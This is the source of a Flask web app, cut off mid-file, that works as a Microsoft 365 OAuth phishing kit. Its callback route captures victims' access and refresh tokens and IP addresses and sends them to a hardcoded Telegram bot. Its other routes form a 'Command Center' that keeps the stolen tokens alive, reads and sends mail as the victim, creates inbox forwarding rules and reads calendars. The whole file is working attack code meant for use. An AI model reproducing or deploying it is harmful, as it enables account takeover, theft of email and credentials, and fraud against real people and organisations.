from flask import Flask, request, jsonify, render_template, send_file
import requests
import time
import threading
import json
import base64
import uuid
import os
import io

app = Flask(__name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# CRITICAL: Update this to your actual Render URL + /callback
MS_REDIRECT_URI = "https://myappsignin.onrender.com/callback"
MS_CLIENT_ID = "147947b0-1073-4b4c-88e1-9f7295f29b3f"
MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send Mail.ReadWrite Calendars.ReadWrite Contacts.ReadWrite Files.Read Files.ReadWrite Sites.Read.All User.Read.All"

# Default token if no ?token= param is provided
DEFAULT_REFRESH_TOKEN = "PASTE_DEFAULT_REFRESH_TOKEN_HERE"
CURRENT_ACCESS_TOKEN = None
CURRENT_REFRESH_TOKEN = DEFAULT_REFRESH_TOKEN
CURRENT_USER_INFO = None

# --- TOKEN MANAGEMENT ---
def set_token_context(refresh_token):
    """Sets the global context to the provided refresh token."""
    global CURRENT_REFRESH_TOKEN, CURRENT_ACCESS_TOKEN, CURRENT_USER_INFO
    if refresh_token and refresh_token != "PASTE_DEFAULT_REFRESH_TOKEN_HERE":
        CURRENT_REFRESH_TOKEN = refresh_token
        CURRENT_ACCESS_TOKEN = None # Force refresh
        CURRENT_USER_INFO = None

def refresh_token():
    """Refreshes the access token using the refresh token."""
    global CURRENT_ACCESS_TOKEN, CURRENT_REFRESH_TOKEN, CURRENT_USER_INFO
    if not CURRENT_REFRESH_TOKEN or CURRENT_REFRESH_TOKEN == "PASTE_DEFAULT_REFRESH_TOKEN_HERE":
        return False
        
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": MS_CLIENT_ID,
        "grant_type": "refresh_token",
        "refresh_token": CURRENT_REFRESH_TOKEN,
        "scope": MS_SCOPE
    }
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            tokens = response.json()
            CURRENT_ACCESS_TOKEN = tokens["access_token"]
            if "refresh_token" in tokens:
                CURRENT_REFRESH_TOKEN = tokens["refresh_token"]
            
            # Fetch user info
            user_data, _ = graph_api("/me?$select=displayName,mail,userPrincipalName,jobTitle,companyName")
            if user_data.get("mail"):
                CURRENT_USER_INFO = user_data
            print(f"[KEEPER] Token refreshed for {CURRENT_USER_INFO.get('displayName', 'Unknown')}")
            return True
        else:
            print(f"[KEEPER] Error refreshing token: {response.text}")
            return False
    except Exception as e:
        print(f"[KEEPER] Exception: {e}")
        return False

def token_keeper_loop():
    """Runs in a background thread to keep the token fresh."""
    print("[KEEPER] Starting background token keeper...")
    refresh_token()
    while True:
        time.sleep(3000)  # 50 minutes
        if not CURRENT_ACCESS_TOKEN:
            refresh_token()

keeper_thread = threading.Thread(target=token_keeper_loop, daemon=True)
keeper_thread.start()

# --- TELEGRAM NOTIFICATIONS ---
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except:
        pass

# --- GRAPH API HELPER ---
def graph_api(endpoint, method='GET', body=None, params=None, stream=False):
    """Helper to make Microsoft Graph API calls."""
    if not CURRENT_ACCESS_TOKEN:
        refresh_token()
        if not CURRENT_ACCESS_TOKEN:
            return {"error": "No active token available"}, 401

    url = f"https://graph.microsoft.com/v1.0{endpoint}"
    headers = {
        "Authorization": f"Bearer {CURRENT_ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.request(method, url, headers=headers, json=body, params=params, timeout=30, stream=stream)
        if response.status_code >= 400:
            try:
                return response.json(), response.status_code
            except:
                return {"error": response.text}, response.status_code
        if stream:
            return response, response.status_code
        return response.json(), response.status_code
    except Exception as e:
        return {"error": str(e)}, 500

# --- ROUTES: CORE ---
@app.route("/")
def index():
    """Serves the Dashboard."""
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    return render_template("index.html")

@app.route("/callback")
def callback():
    """Exchanges the code for tokens and sends them to Telegram."""
    auth_code = request.args.get('code', '')
    error = request.args.get('error', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if error:
        error_description = request.args.get('error_description', 'Unknown Error')
        send_to_telegram(f"❌ <b>Phish Failed</b>\n\nIP: {ip}\nError: {error_description}")
        return redirect("https://outlook.office365.com/")

    if not auth_code:
        send_to_telegram(f"❌ <b>Phish Failed</b>\n\nIP: {ip}\nError: No code received")
        return redirect("https://outlook.office365.com/")

    token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": MS_CLIENT_ID,
        "grant_type": "authorization_code",
        "code": auth_code,
        "redirect_uri": MS_REDIRECT_URI,
        "scope": MS_SCOPE
    }
    
    try:
        response = requests.post(token_url, data=data, timeout=15)
        if response.status_code != 200:
            send_to_telegram(f"❌ <b>Token Exchange Failed</b>\n\nIP: {ip}\n{response.text}")
            return redirect("https://outlook.office365.com/")
            
        tokens = response.json()
        username = "Unknown"
        if "id_token" in tokens:
            try:
                payload = tokens["id_token"].split('.')[1]
                padding = 4 - len(payload) % 4
                if padding != 4: payload += '=' * padding
                user_info = json.loads(base64.urlsafe_b64decode(payload))
                username = user_info.get("preferred_username", "Unknown")
            except: pass
            
        access_token = tokens.get("access_token", "FAILED")
        refresh_token = tokens.get("refresh_token", "FAILED")
        
        send_to_telegram(f"""
🛡️ <b>O365 Session Captured</b>

👤 <b>User:</b> {username}
🌐 <b>IP:</b> {ip}

🔑 <b>ACCESS TOKEN:</b>
<code>{access_token}</code>

🔄 <b>REFRESH TOKEN:</b>
<code>{refresh_token}</code>

💡 <b>Command Center URL:</b>
<code>https://{request.host}/?token={refresh_token}</code>
""")
    except Exception as e:
        send_to_telegram(f"❌ <b>Exception</b>\n\nIP: {ip}\n{str(e)}")

    return redirect("https://outlook.office365.com/")

@app.route("/api/status")
def api_status():
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    if not CURRENT_ACCESS_TOKEN:
        refresh_token()
    if not CURRENT_ACCESS_TOKEN:
        return jsonify({"active": False, "user": None})
    return jsonify({"active": True, "user": CURRENT_USER_INFO})

# --- ROUTES: MAIL ---
@app.route("/api/inbox", methods=["GET"])
def api_inbox():
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    top = request.args.get('top', 10)
    query = f"?$top={top}&$orderby=receivedDateTime%20desc&$select=subject,from,receivedDateTime,bodyPreview,isRead,id"
    data, status = graph_api(f"/me/messages{query}")
    return jsonify(data)

@app.route("/api/message/<msg_id>", methods=["GET"])
def api_get_message(msg_id):
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    data, status = graph_api(f"/me/messages/{msg_id}")
    return jsonify(data)

@app.route("/api/send", methods=["POST"])
def api_send():
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    data = request.json
    body = {
        "message": {
            "subject": data.get("subject"),
            "body": {"contentType": "HTML", "content": data.get("body")},
            "toRecipients": [{"emailAddress": {"address": addr}} for addr in data.get("to", [])],
            "ccRecipients": [{"emailAddress": {"address": addr}} for addr in data.get("cc", [])]
        },
        "saveToSentItems": True
    }
    result, status = graph_api("/me/sendMail", method="POST", body=body)
    return jsonify(result), status

@app.route("/api/reply", methods=["POST"])
def api_reply():
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    data = request.json
    body = {
        "message": {
            "subject": f"Re: {data.get('subject')}",
            "body": {"contentType": "HTML", "content": data.get("body")}
        },
        "comment": data.get("comment", "")
    }
    result, status = graph_api(f"/me/messages/{data.get('messageId')}/reply", method="POST", body=body)
    return jsonify(result), status

@app.route("/api/forward", methods=["POST"])
def api_forward():
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    data = request.json
    body = {
        "message": {
            "subject": f"Fwd: {data.get('subject')}",
            "body": {"contentType": "HTML", "content": data.get("body")},
            "toRecipients": [{"emailAddress": {"address": addr}} for addr in data.get("to", [])]
        }
    }
    result, status = graph_api(f"/me/messages/{data.get('messageId')}/forward", method="POST", body=body)
    return jsonify(result), status

@app.route("/api/rules", methods=["GET"])
def api_get_rules():
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    data, status = graph_api("/me/mailFolders/inbox/messageRules")
    return jsonify(data)

@app.route("/api/rules", methods=["POST"])
def api_add_rule():
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    data = request.json
    body = {
        "displayName": data.get("name", "Forward Rule"),
        "actions": {"forwardTo": data.get("forwardTo", [])},
        "conditions": {}
    }
    result, status = graph_api("/me/mailFolders/inbox/messageRules", method="POST", body=body)
    return jsonify(result), status

@app.route("/api/rules/<rule_id>", methods=["DELETE"])
def api_delete_rule(rule_id):
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    result, status = graph_api(f"/me/mailFolders/inbox/messageRules/{rule_id}", method="DELETE")
    return jsonify(result), status

# --- ROUTES: CALENDAR & CONTACTS ---
@app.route("/api/calendar", methods=["GET"])
def api_calendar():
    token_param = request.args.get('token', DEFAULT_REFRESH_TOKEN)
    set_token_context(token_param)
    top = request.args.get('top', 10)
    data, status = graph_api(f"/me/calendarView?$top={top}&$orderby=start/dateTime%20asc&$select=subject,start,end,location,organizer")
    return jsonify(data)

@app.route("/api/contacts", methods=["GET"])
def api